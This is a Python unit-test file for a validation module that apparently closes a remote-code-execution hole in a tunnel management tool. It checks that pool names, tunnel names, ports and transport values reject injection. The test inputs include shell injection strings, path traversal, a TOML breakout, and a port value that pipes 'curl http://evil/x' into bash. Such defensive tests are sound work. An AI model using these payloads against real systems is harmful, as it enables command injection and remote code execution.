"""Tests for core/validation.py -- the enforcement layer of the security fix.

A regression here silently reopens the remote-RCE chain (C1), so these are
the highest-value tests in the repo. They must stay fast and hermetic.
"""
import sys
import os
import unittest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from core.validation import (
    validate_pool_name,
    validate_tunnel_name,
    validate_port,
    validate_ports,
    validate_transport,
    shquote,
    toml_basic_string,
)

# Minimal stand-in for core.tunnel.SUPPORTED_TRANSPORTS (avoids the paramiko
# dependency of core.ssh_client in unit tests).
SUPPORTED_TRANSPORTS = {
    "1": ("tcp", "Standard TCP"),
    "2": ("stealth", "TCP + Stealth"),
    "3": ("pck", "TCP + PCK"),
}


class TestValidatePoolName(unittest.TestCase):
    def test_canonicalizes(self):
        self.assertEqual(validate_pool_name("My Pool 1"), "my_pool_1")
        self.assertEqual(validate_pool_name("  PROD-EU  "), "prod-eu")

    def test_rejects_shell_injection(self):
        for evil in ['x";id;#', "x$(id)", "x`id`", "x|id", "x&id", "x;reboot",
                     "x/../../etc", "x\nid", "x'OR'1'='1"]:
            with self.assertRaises(ValueError, msg=evil):
                validate_pool_name(evil)

    def test_rejects_empty_and_too_long(self):
        with self.assertRaises(ValueError):
            validate_pool_name("")
        with self.assertRaises(ValueError):
            validate_pool_name("   ")
        with self.assertRaises(ValueError):
            validate_pool_name("a" * 65)


class TestValidateTunnelName(unittest.TestCase):
    def test_accepts_normal(self):
        self.assertEqual(validate_tunnel_name("pool1_ir1"), "pool1_ir1")

    def test_rejects_injection(self):
        for evil in ["a;b", "a b", "a/b", 'a"quote', "a'single"]:
            with self.assertRaises(ValueError, msg=evil):
                validate_tunnel_name(evil)


class TestValidatePort(unittest.TestCase):
    def test_accepts_valid(self):
        self.assertEqual(validate_port("443"), "443")
        self.assertEqual(validate_port(80), "80")
        self.assertEqual(validate_port("  65535  "), "65535")

    def test_rejects_injection(self):
        # The exact payload class from the RCE chain (C1).
        for evil in ["80;curl http://evil/x|bash;#", "443$(id)", "22 && id",
                     "0", "65536", "-1", "abc", "", "22.5", "0x50"]:
            with self.assertRaises(ValueError, msg=repr(evil)):
                validate_port(evil)


class TestValidatePorts(unittest.TestCase):
    def test_dedupes_and_validates(self):
        self.assertEqual(validate_ports(["443", " 80 ", "443"]), ["443", "80"])

    def test_rejects_empty(self):
        for bad in ([], [""], ["  "], None):
            with self.assertRaises(ValueError, msg=repr(bad)):
                validate_ports(bad)

    def test_rejects_any_bad(self):
        with self.assertRaises(ValueError):
            validate_ports(["443", "notaport"])


class TestValidateTransport(unittest.TestCase):
    def test_accepts_supported(self):
        for key, (value, _desc) in SUPPORTED_TRANSPORTS.items():
            self.assertEqual(validate_transport(value, SUPPORTED_TRANSPORTS), value)

    def test_rejects_injection(self):
        with self.assertRaises(ValueError):
            validate_transport('pck"\\nmalicious=1', SUPPORTED_TRANSPORTS)
        with self.assertRaises(ValueError):
            validate_transport("nosuch", SUPPORTED_TRANSPORTS)


class TestTomlEscaping(unittest.TestCase):
    def test_escapes_quotes_and_backslashes(self):
        # A quote in the value must not break out of the TOML string:
        # every interior " must be backslash-escaped.
        evil = 'a"b\\c\nd'
        escaped = toml_basic_string(evil)
        # No raw newlines may survive (would break the single-line TOML value).
        self.assertNotIn("\n", escaped.replace("\\n", ""))
        self.assertNotIn("\r", escaped.replace("\\r", ""))
        # Every quote in the escaped form is either the string delimiter or
        # preceded by a backslash.
        line = f'transport = "{escaped}"'
        inner = line.split("=", 1)[1].strip()[1:-1]  # between delimiters
        import re
        for m in re.finditer(r'"', inner):
            self.assertTrue(m.start() > 0 and inner[m.start() - 1] == "\\",
                            f"unescaped quote in {inner!r}")


class TestShquote(unittest.TestCase):
    def test_neutralizes_metachars(self):
        q = shquote("a;b|c$d")
        # shlex.quote wraps unsafe input in single quotes; the metachars must
        # not appear bare outside the quoting.
        self.assertTrue(q.startswith("'") and q.endswith("'"))
        self.assertIn("a;b|c$d", q)  # content preserved inside quotes
        # Safe input is returned as-is.
        self.assertEqual(shquote("abc123"), "abc123")


if __name__ == "__main__":
    unittest.main()
